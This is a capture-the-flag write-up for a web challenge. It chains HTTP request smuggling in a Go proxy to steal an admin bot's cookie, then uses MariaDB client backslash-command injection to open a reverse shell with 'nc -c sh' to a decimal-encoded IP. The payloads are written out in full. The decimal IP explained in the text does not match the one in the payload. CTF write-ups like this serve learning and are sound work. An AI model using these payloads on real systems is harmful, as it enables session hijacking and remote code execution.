---
title: "Wizard King"
description: "CTF web challenge"
summary: "Wizard King chains CL.TE request smuggling into an admin cookie leak, then turns an admin-only MariaDB client query into RCE."
date: 2026-08-09T00:00:00+02:00
lastmod: 2026-09-13T00:00:00+02:00
tags:
  - CTF
  - walkthrough
  - web
  - Go
  - SQLi
  - MariaDB
  - request-smuggling
categories:
  - writeup
cover: "covers/Wizardking.png"
draft: false
---
<!--more-->

## code

Wizard King had two bugs chained together: request smuggling in the custom Go proxy, then RCE through the MariaDB client from an admin-only Flask route.

The proxy kept one backend TCP connection and reused it between different clients:

```go
var (
    backendCn *bufferedConn
    clRe      = regexp.MustCompile(`(?im)^content-length:\s*(\d+)`)
    teRe      = regexp.MustCompile(`(?im)^transfer-encoding:\s*chunked`)
)

func getBackend() (*bufferedConn, error) {
    if backendCn != nil {
        _ = backendCn.conn.SetDeadline(time.Now().Add(ioTimeout))
        return backendCn, nil
    }
    raw, err := net.DialTimeout("tcp", backend, ioTimeout)
    if err != nil {
        return nil, err
    }
    _ = raw.SetDeadline(time.Now().Add(ioTimeout))
    backendCn = &bufferedConn{conn: raw}
    return backendCn, nil
}
```

It parsed the client request with `Content-Length`, then forwarded the original headers unchanged:

```go
cl := contentLength(head)
for len(body) < cl {
    tmp := make([]byte, 4096)
    n, err := client.Read(tmp)
    if err != nil {
        break
    }
    body = append(body, tmp[:n]...)
}
if len(body) > cl {
    body = body[:cl]
}

resp, err := forward(head, body)
```

The admin login route had the second bug:

```python
@app.route("/admin/login", methods=["GET", "POST"])
def admin_login():
    sess, failure = require_admin()
    if failure:
        return failure

    if request.method == "GET":
        return render_template("admin_login.html", error=None, username=sess["username"])
    elif request.method == "POST":
        try:
            username = request.form["username"]
            password = request.form["password"]

            validate_account_input(username, password)

            result = query(f"SELECT username, role FROM users WHERE username = '{username}' AND password = '{password}'")
            if len(result) == 0:
                raise Exception("Invalid username or password")
```

When `query()` is called without params, it runs the MariaDB CLI:

```python
subprocess.check_output([
    "mariadb",
    "-h" + DB_HOST,
    "-u" + db_user,
    "-p" + db_password,
    "-e",
    sql,
    "--batch",
    "--ssl=0",
    DB_NAME,
])
```

## first step

The first goal was stealing an admin cookie from the bot.

Request smuggling means sending one raw HTTP message that two servers split differently. Here the proxy trusted `Content-Length`, while the Flask/gevent backend accepted `Transfer-Encoding: chunked`.

Simple example:

```text
POST /login ... Content-Length: 51 ... Transfer-Encoding: chunked

0

GET /does-not-exist HTTP/1.1
Host: wizard
```

The proxy sees one request:

```text
request 1 body =
0\r\n
\r\n
GET /does-not-exist HTTP/1.1\r\n
Host: wizard\r\n
\r\n
```

The backend sees two requests:

```text
request 1:
POST /login
body ends at: 0\r\n\r\n

request 2:
GET /does-not-exist HTTP/1.1
Host: wizard
```

The separator is `0\r\n\r\n`. For chunked parsing, that means the first request body is finished. Everything after it becomes the next request on the same backend socket.

## exploit idea

I did not just want to smuggle a normal request. I wanted to create an unfinished `POST /create_ticket/new` request, then make the admin bot's next request become the missing body.

The payload was:

```http
GET /asdasdasdas HTTP/1.1
Host: localhost:8080
Content-Length: 237
Transfer-Encoding: chunked

0

POST /create_ticket/new HTTP/1.1
Host: localhost:8080
Cookie: clover_session=d98e1873ef01ab840b65275a4f2b5c914c50418da4ece9ef91b65da447605582
Content-Type: application/x-www-form-urlencoded
Content-Length: 180

ticket_content=
```

The proxy view:

```text
GET /asdasdasdas
body length = 237 bytes
body = 0\r\n\r\nPOST /create_ticket/new ... ticket_content=
```

The backend view:

```text
request 1 = GET /asdasdasdas
chunked body ends at 0\r\n\r\n

request 2 = POST /create_ticket/new
Cookie = my normal session
Content-Length = 180
body starts with ticket_content=
```

The inner `POST` claims `Content-Length: 180`, but I only send:

```text
ticket_content=
```

So the backend waits for the rest of the body. When the admin bot connects to `/tickets`, those raw HTTP bytes are consumed as the rest of `ticket_content`.

## request flow

The leak works like this:

1. Send the smuggling payload with my normal user cookie inside the inner `POST`.
2. The backend leaves `POST /create_ticket/new` half-open.
3. The admin bot visits `/tickets`.
4. The bot's raw request gets appended after `ticket_content=`.
5. Flask creates a ticket under my account.
6. I open the ticket and read the bot's cookie from the ticket body.

The ticket showed the bot request:

![Leaked admin cookie inside a Wizard King ticket](/img/wizard-king/admin-cookie-ticket.png)

The important line is:

```http
Cookie: clover_session=<admin-token>
```

Now I had an admin session.

## second bug

With the admin cookie, I could reach `/admin/login`.
> this part i solved it in challenge before 

The route validates the username and password with this regex:

```python
ACCOUNT_PATTERN = r"^[a-zA-Z0-9\\ -]+$"
```

That blocks quotes and semicolons, but it still allows backslashes and spaces. This matters because the MariaDB command-line client has backslash commands.

I used:

```text
username = \
password = \c\d x system nc -c sh 2839186686 9001 x\q
```

The SQL sent to `mariadb -e` begins like this:

```sql
SELECT username, role FROM users WHERE username = '\' AND password = '\c\d x system nc -c sh 2839186686 9001 x\q'
```

Why this works:

- `username = \` escapes the closing quote after `username`
- `\c` cancels the unfinished `SELECT`
- `\d x` changes the MariaDB delimiter to `x`
- `system nc -c sh 2839186686 9001` is a MariaDB client command
- the next `x` terminates the command
- `\q` quits the MariaDB client

The core MariaDB-client command is:

```text
\d x system nc -c sh 2839186686 9001 x\q
```


`2886991873` is `172.20.0.1` as a decimal IPv4 address.

## resources

- MariaDB command-line client: [mariadb Command-Line Client](https://mariadb.com/docs/server/clients-and-utilities/mariadb-client/mariadb-command-line-client)

## solver

The solve chain is:

1. register or log in as a normal user
2. send the CL.TE smuggling payload
3. wait for the bot to visit `/tickets`
4. read the leaked admin cookie from the ticket
5. use the admin cookie on `/admin/login`
6. trigger the MariaDB client `system` command
7. read `/flag_*.txt` from the reverse shell

After the shell connected back:

```bash
cat /flag_*.txt
```

## flag

```text
CATF{F1n4lly_U_B3c4m3_Th3_w1zard_K1ing}
```
